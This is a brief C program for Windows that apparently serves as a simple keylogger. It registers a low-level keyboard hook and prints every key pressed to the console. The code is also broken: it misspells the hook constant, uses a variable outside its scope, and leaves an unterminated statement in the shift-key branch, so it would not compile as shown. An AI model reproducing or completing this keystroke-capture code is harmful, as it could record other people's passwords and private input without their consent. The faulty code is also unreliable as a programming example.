#include <stdio.h>
#include <windows.h>

/*
HHOOK SetWindowsHookExA(
int         idHook,
HOOOKPROC   lpfn,
HINSTANCE   hmod,
DWORD       dwThreadId
);
*/

HHOOK hook;

LRESULT CALLBACK funcHook(int codigo, WPARAM wParam, LPARAM lParam);

int main(){

    MSG msg;
    char ch;

    hook = SetWindowsHookExA(wH_KEYBOARD_LL, funcHook, NULL, 0);
    if(hook == NULL){
        printf("Error;");
        return(1);
    }

    while (GetMessage(&msg, NULL, 0, 0) != 0){
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
}

LRESULT CALLBACK funcHook(int codigo, WPARAM wParam, LPARAM lParam){
    PKBDLLHOOKSTRUCT kbDllHook = (PKBDLLHOOKSTRUCT)lParam;
        if(wParam == WM_KEYDOWN && codigo == HC_ACTION){
            if(!GetAsyncKeyState(VK_SHIFT)){
                ch = kbDllHook->vkCode + 32;
            }else{
                kbDllHook->vkCode
            }
                printf("%c", ch);
        }
                return(CallNextHookEx(hook, codigo, wParam, lParam));
}
